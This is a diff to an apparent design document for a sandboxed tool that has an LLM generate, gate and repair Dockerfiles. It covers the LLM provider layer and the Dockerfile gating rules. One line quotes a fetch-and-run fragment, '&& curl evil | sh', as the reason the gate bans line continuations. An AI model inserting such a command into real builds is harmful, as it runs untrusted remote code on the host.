@@ -8,8 +8,10 @@ builds and runs it in a hardened container, repairs on failure in a capped loop 
 bounded evidence, and reports what the script tried to do. Python and Bash only, claimed
 honestly.
 
-Size target 400 to 600 lines including tests. Past 800, stop and ask what went wrong.
-Any module that wants a subdirectory has outgrown this project.
+Size target is roughly 650 lines including tests, and it is a smell detector, not a
+limit: if a module needs the lines to be correct, it gets them, and a sudden jump of a
+few hundred is a signal to stop and ask what happened. Any module that wants a
+subdirectory has outgrown this project.
 
 ## Security constraints, not negotiable
 Host CLI. No Docker socket is mounted anywhere, and the agent itself is never
@@ -32,6 +34,39 @@ reaches a prompt.
 
 The verdict is produced after the sandboxed run, from observed behaviour. The model's
 opinion is one input, labelled advisory, never the gate.
+
+## The LLM layer
+One file, `envforge/llm.py`, roughly 100 to 140 lines: an `LLM` Protocol, `AnthropicLLM`
+on the native SDK using strict tool use, `OpenAICompatLLM` on the openai SDK covering
+both OpenAI and Groq through `base_url`, and `make_llm("provider:model")` validating the
+spec at startup. No LiteLLM, no LangChain model classes, and not one OpenAI client for
+all three: Anthropic's compatibility layer ignores `strict`, so the only grammar
+guarantee for Claude is on the native API, and Anthropic's own docs call that layer
+non-production.
+
+Anthropic and OpenAI give grammar-constrained arguments. Groq accepts the forced named
+call but its schema guarantee is documented as incompatible with tool use, so Groq is
+forced-call-plus-validation, and a validation failure there is one more repairable
+failure rather than a crash. Every provider validates the returned arguments anyway.
+
+The result carries the parsed arguments, the model taken from the response rather than
+the request, token counts, and the raw request and response JSON for the trace module.
+Nothing in the middle hides usage or cost.
+
+## How the Dockerfile is produced
+A forced strict tool call with a single `dockerfile` string field, plus `base_image`
+declared separately so the gate can check it without parsing. Not raw text with fences
+stripped: that is an extraction heuristic standing between the model and the gate.
+
+Repair uses the same tool call and returns the complete rewritten Dockerfile, never a
+diff. One code path, one schema, one gate entry point, and a whole artifact is the only
+thing the gate can re-check soundly.
+
+The gate bans line continuations, so every physical line is blank, a comment, or starts
+with an allowlisted instruction. Two reasons. A literal backslash must be `\\` inside a
+JSON string, and a model that emits `\n` instead produces a string that decodes cleanly
+into a different Dockerfile, which no grammar constraint can catch. And a continued line
+starts mid-instruction, which is exactly where `&& curl evil | sh` hides.
 
 ## Shape
 Plain loop first, LangGraph port immediately after, both engines behind one interface.
